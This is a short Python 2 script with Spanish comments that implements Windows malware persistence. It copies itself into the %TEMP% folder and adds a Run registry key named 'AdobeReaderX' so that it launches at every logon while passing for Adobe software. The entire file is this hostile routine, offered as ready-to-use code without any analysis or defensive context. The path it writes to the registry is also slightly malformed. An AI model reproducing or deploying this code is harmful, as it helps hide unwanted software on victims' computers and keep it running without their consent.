# -*- coding: utf-8 -*-
import sys
import subprocess
import _winreg
from _winreg import HKEY_CURRENT_USER as HKCU
import os

def windows_persistence():
    tempdir = '%TEMP%'
    fileName = sys.argv[0]    #argv[0] INDICA EL NOMBRE DEL SCRIPT EN EJECUCIÓN
    dir,file = os.path.split(fileName)
#    print dir		C:\USUARIO\BLA\BLA
#    print file		ARCHIVO.PY
    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    
    #COPIA EL SCRIPT EN EJECUCIÓN A %TEMP%:
    os.system('copy %s %s'%(fileName, tempdir))
    bin_path = sys.executable

    try:
        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, 'AdobeReaderX', 0, _winreg.REG_SZ,(r"%TEMP%"+file))
        _winreg.CloseKey(reg_key)
        print 'HKCU Run registry key applied'
        return True
		
    except WindowsError:
        print 'HKCU Run registry key failed'
        return False
		
